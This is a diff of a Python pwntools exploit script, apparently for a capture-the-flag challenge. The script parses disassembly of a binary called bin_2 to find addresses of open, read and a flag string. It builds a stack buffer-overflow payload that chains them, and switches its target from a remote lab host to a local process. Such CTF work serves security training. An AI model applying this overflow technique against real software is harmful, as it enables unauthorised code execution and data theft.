@@ -61,12 +61,30 @@ for i in range(len(lines)):
 #print(ifname)
 #print(x)
 
-cmd = "grep '<flag>:' bin_2.asm |awk '{print $1}'"
-proc = os.popen(cmd)
-addr = p64(int(proc.read().replace('\n',''),16))
-proc.close()
+#cmd = "grep '<flag>:' bin_2.asm |awk '{print $1}'"
+#proc = os.popen(cmd)
+#addr = p64(int(proc.read().replace('\n',''),16))
+#proc.close()
 #print(addr)
-addr = p64(0x401183)
+#addr = p64(0x401183)
+
+cmd = "grep '<open>:' bin_2.asm |awk '{print $1}'"
+proc = os.popen(cmd)
+openaddr = p64(int(proc.read().replace('\n',''),16))
+proc.close()
+print(openaddr)
+
+cmd = "grep '<read>:' bin_2.asm |awk '{print $1}'"
+proc = os.popen(cmd)
+readaddr = p64(int(proc.read().replace('\n',''),16))
+proc.close()
+print(readaddr)
+
+flagaddr = p64(0x40a2b5)
+fd = p32(0x3)
+#printaddr = p64(0x40a2aa)
+printaddr = p64(0x40c008)
+length = p64(0x20)
 
 cmd = " awk '/<vuln>:/,/lea/{print}' bin_2.asm"
 proc = os.popen(cmd)
@@ -75,15 +93,16 @@ buflen = int(buf[4].split('\t')[2].split()[1].split(',')[0][1:],16)
 if buflen > 2**63:
     buflen = 2**64 - buflen
 magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
-rbp = p64(0x7fffffffff80)
-shellcode = b'A'*(buflen-4)+magic+rbp+addr
+rbp = b'A'*8
+shellcode = b'A'*(buflen-4)+magic+rbp+openaddr+readaddr+flagaddr+fd+printaddr+length
 #shellcode = 'A'*(buflen-4)+magic+rbp+addr
 
-#cmd = "chmod +x bin_2"
-#os.system(cmd)
-#io = process('./bin_2')
+cmd = "chmod +x bin_2"
+os.system(cmd)
+io = process('./bin_2')
 
-io = remote('10.102.60.248',1180)
+#io = remote('10.102.60.248',1180)
+#io = remote('127.0.0.1',5000)
 
 io.recvuntil(' hmmm.....')
 io.sendline(ifname)
@@ -91,7 +110,6 @@ io.sendline(str(x))
 io.sendline(shellcode)
 print(magic)
 print(rbp)
-print(addr)
 print(shellcode)
 print(io.recvline())
 print(io.recvline())
